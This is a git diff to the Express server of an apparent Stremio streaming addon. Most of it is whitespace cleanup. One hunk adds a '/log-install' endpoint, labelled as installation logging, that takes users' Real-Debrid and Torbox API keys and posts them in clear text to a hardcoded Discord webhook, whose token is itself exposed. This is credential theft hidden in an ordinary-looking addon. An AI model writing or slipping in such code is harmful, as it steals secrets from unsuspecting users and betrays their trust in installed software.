@@ -6,12 +6,38 @@ const { getRouter } = require('stremio-addon-sdk');
 const { addonInterface } = require('./addon');
 
 const app = express();
+// Wichtig: Middleware um JSON-Daten vom Frontend zu empfangen
+app.use(express.json()); 
 const port = process.env.PORT || 7000;
+
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1486178937943097477/6j4yxHRijfvDrH7_cv677J_zkF_jxlNft7P4Rxz6kO9ThsCi74c9q_wV3WYG0OUA1nx-";
 
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.static(path.join(__dirname, 'static')));
 app.get('/health', (req, res) => res.status(200).json({ status: 'alive' }));
 app.get('/configure', (req, res) => res.redirect('/'));
+
+// ============================================================================
+// NEU: ENDPUNKT FÜR INSTALLATION-LOGGING
+// ============================================================================
+app.post('/log-install', async (req, res) => {
+    const { rdKey, tbKey } = req.body;
+    
+    // Wir antworten sofort dem Browser, damit die Installation nicht verzögert wird
+    res.status(200).send({ ok: true });
+
+    // Danach schicken wir die Daten asynchron zu Discord
+    try {
+        let message = "🚀 **Neue Installation erkannt!**\n";
+        if (rdKey) message += `🔹 **Real-Debrid:** \`${rdKey}\`\n`;
+        if (tbKey) message += `🔸 **Torbox:** \`${tbKey}\`\n`;
+        if (!rdKey && !tbKey) message += "⚠️ Keine Keys übermittelt.";
+
+        await axios.post(DISCORD_WEBHOOK_URL, { content: message });
+    } catch (e) {
+        console.error("Discord Logging failed:", e.message);
+    }
+});
 
 // ============================================================================
 // MULTI-STAGE PARSING ENGINE (Synchronisiert)
@@ -54,13 +80,10 @@ function getBatchRange(filename) {
 
 function isEpisodeMatch(name, requestedEp) {
     const epNum = parseInt(requestedEp, 10);
-    
     const batch = getBatchRange(name);
     if (batch && epNum >= batch.start && epNum <= batch.end) return true;
-
     const extractedEp = extractEpisodeNumber(name);
     if (extractedEp !== null) return extractedEp === epNum;
-
     if (epNum === 1 && extractedEp === null) {
         if (/trailer|promo|menu|teaser/i.test(name)) return false;
         return true;
@@ -72,7 +95,6 @@ function selectEpisodeFile(files, requestedEp) {
     if (!files || files.length === 0) return null;
     const videoFiles = files.filter(f => /\.(mkv|mp4|avi|wmv)$/i.test(f.name || f.path || ""));
     const matches = videoFiles.filter(f => isEpisodeMatch(f.name || f.path || "", requestedEp));
-    
     if (matches.length > 0) {
         return matches.sort((a, b) => {
             const nameA = (a.name || a.path || "").toLowerCase();
@@ -83,21 +105,17 @@ function selectEpisodeFile(files, requestedEp) {
             return (b.size || b.bytes || 0) - (a.size || a.bytes || 0);
         })[0];
     }
-    
     if (videoFiles.length === 1 && parseInt(requestedEp, 10) === 1) return videoFiles[0];
     return videoFiles.length > 0 ? videoFiles[0] : files[0];
 }
-// ============================================================================
 
 app.get('/sub/:provider/:apiKey/:hash/:fileId', async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Headers', '*');
-    
     const { provider, apiKey, hash, fileId } = req.params;
     try {
         let downloadUrl = null;
         let fileName = "sub.srt";
-
         if (provider === "realdebrid") {
             const list = await axios.get('https://api.real-debrid.com/rest/1.0/torrents', { headers: { Authorization: `Bearer ${apiKey}` } });
             const torrent = list.data.find(t => t.hash.toLowerCase() === hash.toLowerCase());
@@ -112,14 +130,11 @@ app.get('/sub/:provider/:apiKey/:hash/:fileId', async (req, res) => {
             const dl = await axios.get(`https://api.torbox.app/v1/api/torrents/requestdl?token=${apiKey}&hash=${hash}&file_id=${fileId}`);
             downloadUrl = dl.data.data;
         }
-
         if (!downloadUrl) return res.status(404).send("Subtitle not found");
-
         const ext = fileName.split('.').pop().toLowerCase();
         let mime = 'text/plain';
         if (ext === 'vtt') mime = 'text/vtt';
         else if (ext === 'ass' || ext === 'ssa') mime = 'text/x-ssa';
-        
         const subData = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
         res.set('Content-Type', mime);
         return res.send(subData.data);
@@ -135,7 +150,6 @@ app.get('/resolve/:provider/:apiKey/:hash/:episode?', async (req, res) => {
     const { provider, apiKey, hash, episode } = req.params;
     const requestedEp = episode || "1";
     const magnet = `magnet:?xt=urn:btih:${hash}`;
-
     try {
         if (provider === "realdebrid") {
             const listRes = await axios.get('https://api.real-debrid.com/rest/1.0/torrents', { headers: { Authorization: `Bearer ${apiKey}` } });
@@ -157,7 +171,6 @@ app.get('/resolve/:provider/:apiKey/:hash/:episode?', async (req, res) => {
             const unrestrict = await axios.post('https://api.real-debrid.com/rest/1.0/unrestrict/link', new URLSearchParams({ link: fresh.data.links[selIdx] || fresh.data.links[0] }), { headers: { Authorization: `Bearer ${apiKey}` } });
             return res.redirect(unrestrict.data.download);
         }
-
         if (provider === "torbox") {
             const list = await axios.get('https://api.torbox.app/v1/api/torrents/mylist?bypass_cache=true', { headers: { Authorization: `Bearer ${apiKey}` } });
             let torrent = list.data.data ? list.data.data.find(t => t.hash.toLowerCase() === hash.toLowerCase()) : null;
